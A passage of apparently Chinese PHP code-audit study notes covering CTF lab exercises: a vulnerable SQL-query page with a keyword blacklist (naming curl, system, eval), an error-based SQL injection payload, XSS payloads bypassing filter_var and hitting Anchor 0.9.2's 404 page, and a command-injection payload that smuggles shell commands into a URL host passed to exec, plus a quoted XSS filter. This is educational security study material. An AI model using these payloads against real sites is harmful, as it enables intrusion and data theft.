border=&#x27;1&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;center&gt;<span class="subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;day1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">	$pattern = <span class="string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;</span><br><span class="line">	$back_list = explode(<span class="string">&quot;|&quot;</span>,$pattern);</span><br><span class="line">	<span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, $value))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$hack</span> detected!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建CTF环境使用的sql语句</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day1;</span><br><span class="line"><span class="keyword">use</span> day1;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">6</span>) <span class="keyword">unsigned</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">email <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">salary <span class="built_in">int</span>(<span class="number">8</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Lucia&#x27;</span>,<span class="string">&#x27;Lucia@hongri.com&#x27;</span>,<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Danny&#x27;</span>,<span class="string">&#x27;Danny@hongri.com&#x27;</span>,<span class="number">4500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;Alina&#x27;</span>,<span class="string">&#x27;Alina@hongri.com&#x27;</span>,<span class="number">2700</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;Jameson&#x27;</span>,<span class="string">&#x27;Jameson@hongri.com&#x27;</span>,<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Allie&#x27;</span>,<span class="string">&#x27;Allie@hongri.com&#x27;</span>,<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag(flag <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>尝试对<code>id</code>这个参数注入发现<code>config.php</code>对注入进行了限制，过滤了关键字<code>insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval</code>。</p>
<p>我们可以使用报错注入，把<code>group_concat</code>换成<code>make_set</code>函数用于拼接字符串。</p>
<blockquote>
<p>make_set：<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">https://blog.csdn.net/qq_41725312/article/details/83039525</a></p>
</blockquote>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP-Audit-Labs&#x2F;day1&#x2F;?id&#x3D;3%20and%20(select%20updatexml(1,make_set(3,%27~%27,(select%20flag% 20from％20flag）），1））</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200609192811.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习——Day2</title>
    <url>/code_audit/PHP/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习——Day1-var-filter函数缺陷">PHP代码审计学习——Day1 var_filter函数缺陷</h1>
<h2 id="0x01-Day2-Twig">0x01 Day2 - Twig</h2>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// composer require &quot;twig/twig&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">&#x27;&lt;img &#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">&#x27;index.html&#x27;</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">&#x27;nextSlide&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">      [<span class="string">&#x27;link&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>
<p>这段代码涉及到了PHP的模板引擎Twig，直接来简化一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url = filter_var($_GET[<span class="string">&#x27;url&#x27;</span>], FILTER_VALIDATE_URL);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	$url = htmlspecialchars($url);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;<span class="subst">$url</span>&#x27;&gt; Next Slide &lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分别解释一下这两个函数：</p>
<ul>
<li>
<p><a href="http://php.net/manual/zh/function.filter-var.php">filter_var </a>：(PHP 5 &gt;= 5.2.0, PHP 7)</p>
<p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p>
<p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p>
</li>
<li>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php">htmlspecialchars </a>：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：将特殊字符转换为 HTML 实体</p>
<p><strong>定义</strong> ：string <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(“default_charset”) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &amp; (&amp; 符号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;</span><br><span class="line">&gt; &quot; (双引号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &quot;</span><br><span class="line">&gt; &#39; (单引号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;apos;</span><br><span class="line">&gt; &lt; (小于号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &lt;</span><br><span class="line">&gt; &gt; (大于号)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>针对这两处的过滤，我们可以考虑使用 <strong>javascript伪协议</strong> 来绕过。我们使用 payload ：<code>?url=javascript://comment％250aalert(1)</code> ，可以执行 <strong>alert</strong> 函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610212646.png" alt=""></p>
<p>解释一下这个Payload：</p>
<p>这里的 <strong>//</strong> 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 <strong>alert</strong> 函数呢？那是因为我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>//</strong> 就不在同一行，就能执行。当然，这里我们要对 <strong>%</strong> 百分号编码成 <strong>%25</strong> ，因为程序将浏览器发来的payload：<code>javascript://comment％250aalert(1)</code> 先解码成： <code>javascript://comment%0aalert(1)</code> 存储在变量 <strong>$url</strong> 中（上图第二行代码），然后用户点击a标签链接就会触发 <strong>alert</strong> 函数。</p>
<h2 id="0x02-实例分析">0x02 实例分析</h2>
<p>今天的实例用的是 <strong>Anchor 0.9.2</strong> 版本，在该版本中，当用户访问一个不存在的URL链接时，程序会调用404模板，而这个模板则存在XSS漏洞。问题存在于<code>404.php</code>：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span> <span class="attr">theme_include</span>(&#x27;<span class="attr">header</span>&#x27;); ?&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;content wrap&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Page not found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Unfortunately, the page <span class="tag">&lt;<span class="name">code</span>&gt;</span>/<span class="tag">&lt;<span class="name">?php</span> <span class="attr">echo</span> <span class="attr">current_url</span>(); ?&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span> could not be found. Your best bet is either to try the <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;?php echo base_url(); ?&gt;&quot;</span>&gt;</span>homepage<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, try <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#search&quot;</span>&gt;</span>searching<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, or go and cry in a corner (although I don’t recommend the latter).<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span> <span class="attr">theme_include</span>(&#x27;<span class="attr">footer</span>&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>current_url()</code>将读取当前环境的<code>SERVER['PATH_INFO']</code>的值，然后再回显到页面上。</p>
<p>原文中的利用链涉及多个函数，但是我在本地环境复现进行单步调试时，却并没有进入到<code>detect()</code>函数中，而是直接返回了<code>current</code>的值，尝试了很多次也没找到复现失败的原因，这里先留一个坑。</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;anchor&#x2F;index.php&#x2F;&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610232456.png" alt=""></p>
<h2 id="0x03-防御方式">0x03 防御方式</h2>
<p>对XSS漏洞，我们最好就是过滤关键词，将特殊字符进行HTML实体编码替换，这里引用Dedecms中防御XSS的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span>(<span class="params">$val</span>) </span>&#123;</span><br><span class="line">       $val = preg_replace(<span class="string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $val);</span><br><span class="line">       $search = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123;</span><br><span class="line">          $val = preg_replace(<span class="string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span>.dechex(ord($search[$i])).<span class="string">&#x27;;?)/i&#x27;</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">          $val = preg_replace(<span class="string">&#x27;/(&amp;#0&#123;0,8&#125;&#x27;</span>.ord($search[$i]).<span class="string">&#x27;;?)/&#x27;</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $ra1 = <span class="keyword">array</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;vbscript&#x27;</span>, <span class="string">&#x27;expression&#x27;</span>, <span class="string">&#x27;applet&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;blink&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frameset&#x27;</span>, <span class="string">&#x27;ilayer&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;bgsound&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">       $ra2 = <span class="keyword">array</span>(<span class="string">&#x27;onabort&#x27;</span>, <span class="string">&#x27;onactivate&#x27;</span>, <span class="string">&#x27;onafterprint&#x27;</span>, <span class="string">&#x27;onafterupdate&#x27;</span>, <span class="string">&#x27;onbeforeactivate&#x27;</span>, <span class="string">&#x27;onbeforecopy&#x27;</span>, <span class="string">&#x27;onbeforecut&#x27;</span>, <span class="string">&#x27;onbeforedeactivate&#x27;</span>, <span class="string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="string">&#x27;onbeforepaste&#x27;</span>, <span class="string">&#x27;onbeforeprint&#x27;</span>, <span class="string">&#x27;onbeforeunload&#x27;</span>, <span class="string">&#x27;onbeforeupdate&#x27;</span>, <span class="string">&#x27;onblur&#x27;</span>, <span class="string">&#x27;onbounce&#x27;</span>, <span class="string">&#x27;oncellchange&#x27;</span>, <span class="string">&#x27;onchange&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;oncontextmenu&#x27;</span>, <span class="string">&#x27;oncontrolselect&#x27;</span>, <span class="string">&#x27;oncopy&#x27;</span>, <span class="string">&#x27;oncut&#x27;</span>, <span class="string">&#x27;ondataavailable&#x27;</span>, <span class="string">&#x27;ondatasetchanged&#x27;</span>, <span class="string">&#x27;ondatasetcomplete&#x27;</span>, <span class="string">&#x27;ondblclick&#x27;</span>, <span class="string">&#x27;ondeactivate&#x27;</span>, <span class="string">&#x27;ondrag&#x27;</span>, <span class="string">&#x27;ondragend&#x27;</span>, <span class="string">&#x27;ondragenter&#x27;</span>, <span class="string">&#x27;ondragleave&#x27;</span>, <span class="string">&#x27;ondragover&#x27;</span>, <span class="string">&#x27;ondragstart&#x27;</span>, <span class="string">&#x27;ondrop&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onerrorupdate&#x27;</span>, <span class="string">&#x27;onfilterchange&#x27;</span>, <span class="string">&#x27;onfinish&#x27;</span>, <span class="string">&#x27;onfocus&#x27;</span>, <span class="string">&#x27;onfocusin&#x27;</span>, <span class="string">&#x27;onfocusout&#x27;</span>, <span class="string">&#x27;onhelp&#x27;</span>, <span class="string">&#x27;onkeydown&#x27;</span>, <span class="string">&#x27;onkeypress&#x27;</span>, <span class="string">&#x27;onkeyup&#x27;</span>, <span class="string">&#x27;onlayoutcomplete&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onlosecapture&#x27;</span>, <span class="string">&#x27;onmousedown&#x27;</span>, <span class="string">&#x27;onmouseenter&#x27;</span>, <span class="string">&#x27;onmouseleave&#x27;</span>, <span class="string">&#x27;onmousemove&#x27;</span>, <span class="string">&#x27;onmouseout&#x27;</span>, <span class="string">&#x27;onmouseover&#x27;</span>, <span class="string">&#x27;onmouseup&#x27;</span>, <span class="string">&#x27;onmousewheel&#x27;</span>, <span class="string">&#x27;onmove&#x27;</span>, <span class="string">&#x27;onmoveend&#x27;</span>, <span class="string">&#x27;onmovestart&#x27;</span>, <span class="string">&#x27;onpaste&#x27;</span>, <span class="string">&#x27;onpropertychange&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, <span class="string">&#x27;onreset&#x27;</span>, <span class="string">&#x27;onresize&#x27;</span>, <span class="string">&#x27;onresizeend&#x27;</span>, <span class="string">&#x27;onresizestart&#x27;</span>, <span class="string">&#x27;onrowenter&#x27;</span>, <span class="string">&#x27;onrowexit&#x27;</span>, <span class="string">&#x27;onrowsdelete&#x27;</span>, <span class="string">&#x27;onrowsinserted&#x27;</span>, <span class="string">&#x27;onscroll&#x27;</span>, <span class="string">&#x27;onselect&#x27;</span>, <span class="string">&#x27;onselectionchange&#x27;</span>, <span class="string">&#x27;onselectstart&#x27;</span>, <span class="string">&#x27;onstart&#x27;</span>, <span class="string">&#x27;onstop&#x27;</span>, <span class="string">&#x27;onsubmit&#x27;</span>, <span class="string">&#x27;onunload&#x27;</span>);</span><br><span class="line">       $ra = array_merge($ra1, $ra2);</span><br><span class="line"></span><br><span class="line">       $found = <span class="literal">true</span>; </span><br><span class="line">       <span class="keyword">while</span> ($found == <span class="literal">true</span>) &#123;</span><br><span class="line">          $val_before = $val;</span><br><span class="line">          <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123;</span><br><span class="line">             $pattern = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">             <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;)*&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $pattern .= $ra[$i][$j];</span><br><span class="line">             &#125;</span><br><span class="line">             $pattern .= <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">             $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">&#x27;&lt;x&gt;&#x27;</span>.substr($ra[$i], <span class="number">2</span>);</span><br><span class="line">             $val = preg_replace($pattern, $replacement, $val); </span><br><span class="line">             <span class="keyword">if</span> ($val_before == $val) &#123;</span><br><span class="line">                $found = <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $val;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-CTF练习">0x04 CTF练习</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,$site_info[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        exec(<span class="string">&#x27;curl &quot;&#x27;</span>.$site_info[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">&#x27; &#x27;</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>mochazz师傅给的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>但是相同的payload不能成功，问题出在<code>parse_url()</code>解析的时候：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;scheme&quot;]&#x3D;&gt; string(4) &quot;demo&quot; </span><br><span class="line">[&quot;host&quot;]&#x3D;&gt; string(5) &quot;&quot;;ls;&quot; </span><br><span class="line">[&quot;fragment&quot;]&#x3D;&gt; string(20) &quot;;sec-redclub.com:80&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<p>这样就会导致<code>perg_match</code>匹配失败。我换了另外一个payload，用于闭合最后一个<code>&quot;</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.153.132:8003&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611164855.png" alt=""></p>
<p>解释一下这个Payload：</p>
<p>先来绕过 <strong>filter_var</strong> 的 <strong>FILTER_VALIDATE_URL</strong> 过滤器，这里提供几个绕过方法，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure>
